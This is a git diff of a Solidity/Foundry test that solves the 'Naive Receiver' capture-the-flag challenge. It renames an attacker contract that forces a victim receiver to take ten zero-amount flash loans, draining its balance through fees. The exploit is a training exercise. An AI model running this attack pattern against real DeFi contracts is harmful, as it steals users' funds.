@@ -49,9 +49,11 @@ contract NaiveReceiver is Test {
          * EXPLOIT START *
          */
         vm.startPrank(attacker);
-        AttackerContract attackerContract = new AttackerContract(payable(address(naiveReceiverLenderPool)));
-        attackerContract.attack(address(flashLoanReceiver));
+        NaiveReceiverAttacker naiveReceiverAttacker =
+            new NaiveReceiverAttacker(payable(address(naiveReceiverLenderPool)));
+        naiveReceiverAttacker.attack(address(flashLoanReceiver)); // Let attacker execute 10 times of flashloan.
         vm.stopPrank();
+
         /**
          * EXPLOIT END *
          */
@@ -66,16 +68,16 @@ contract NaiveReceiver is Test {
     }
 }
 
-contract AttackerContract {
-    address payable pool;
+contract NaiveReceiverAttacker {
+    address payable lenderPool;
 
-    constructor(address payable poolAddress) {
-        pool = poolAddress;
+    constructor(address payable lenderPool_) {
+        lenderPool = lenderPool_;
     }
 
     function attack(address borrower) external {
         for (uint256 i = 0; i < 10; i++) {
-            NaiveReceiverLenderPool(pool).flashLoan(borrower, 0);
+            NaiveReceiverLenderPool(lenderPool).flashLoan(borrower, 0);
         }
     }
 }
